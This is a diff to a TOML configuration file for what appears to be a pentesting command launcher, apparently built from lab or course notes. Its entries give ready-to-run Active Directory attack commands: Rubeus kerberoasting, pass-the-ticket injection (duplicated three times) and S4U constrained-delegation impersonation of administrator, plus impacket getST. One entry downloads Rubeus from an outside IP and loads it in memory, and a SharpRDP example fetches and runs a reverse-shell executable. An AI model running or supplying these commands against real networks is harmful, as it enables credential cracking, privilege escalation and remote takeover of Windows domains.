@@ -12,16 +12,6 @@ cmd_types = "compilation"
 short_desc = "Build JS file from C# Code"
 args = ".\\DotNetToJScript.exe <dll2tranform|.\\ExampleAssembly.dll> --lang=Jscript --ver=v4 -o <outfile|demo.js>"
 
-[command.Rubeus]
-use_name = "rubeus"
-local = true
-cmd_types = "pentest|network|windows"
-short_desc = "Request a TGS and try to crack the service account password"
-args = ".\\Rubeus.exe kerberoast /outfile:<outfile|hashes.kerberoast>"
-examples = [
-    ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"
-]
-
 [command.GetNPUsers]
 use_name = "GetNPUsers AS-REP roasting"
 local = false
@@ -81,4 +71,46 @@ args = ".\\SharpRDP.exe computername=<target-hostname> username=<domain\\user> p
 examples = [
     ".\\SharpRDP.exe computername=appsrv01 username=corp1\\dave password=lab command=\"powershell (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/rev.exe', 'C:\\Windows\\Tasks\\rev.exe'); C:\\Windows\\Tasks\\rev.exe\""
 ]
+
+[command.Rubeus0]
+use_name = "Rubeus"
+local = true
+cmd_types = "lateralization|windows"
+short_desc = "Inject Ticket into session"
+args = ".\\Rubeus.exe ptt /ticket:<BASE64FTGT>"
+
+[command.Rubeus1]
+use_name = "Rubeus"
+local = true
+cmd_types = "lateralization|windows"
+short_desc = "Inject Ticket into session"
+args = ".\\Rubeus.exe ptt /ticket:<BASE64FTGT>"
+
+[command.Rubeus2]
+use_name = "Rubeus"
+local = true
+cmd_types = "lateralization|windows"
+short_desc = "Inject Ticket into session"
+args = ".\\Rubeus.exe ptt /ticket:<BASE64FTGT>"
+
+[command.Rubeus3]
+use_name = "Rubeus"
+local = true
+cmd_types = "lateralization|windows"
+short_desc = "Kerberoast - AS-REQ (used to crack a service account password)"
+args = ".\\Rubeus.exe kerberoast /outfile:<outfile|hashes.kerberoast>"
+
+[command.Rubeus4]
+use_name = "Rubeus"
+local = true
+cmd_types = "lateralization|windows"
+short_desc = "S4U from loaded Assembly (Constrained Delegation)"
+args = "$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.222/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);[Rubeus.Program]::Main('purge'.Split());[Rubeus.Program]::Main('s4u /user:WEB01$ /rc4:<NTLM-HASH-WEB01$> /impersonateuser:administrator /msdsspn:cifs/file01 /ptt'.Split())"
+
+[command.GetST]
+use_name = "getST.py - impacket"
+local = true
+cmd_types = "lateralization|windows"
+short_desc = "Constrained Delegation => TGS + impersonate (s4u) with forwardable TGT loaded"
+args = "getST.py -spn <SPN|mssqlsvc/SQL01.corp.com:1433> -impersonate <user-to-impersonate|administrator> <service-account-owned|corp.com/iissvc> -dc-ip <dc-ip|127.0.0.1> -k -no-pass"
 
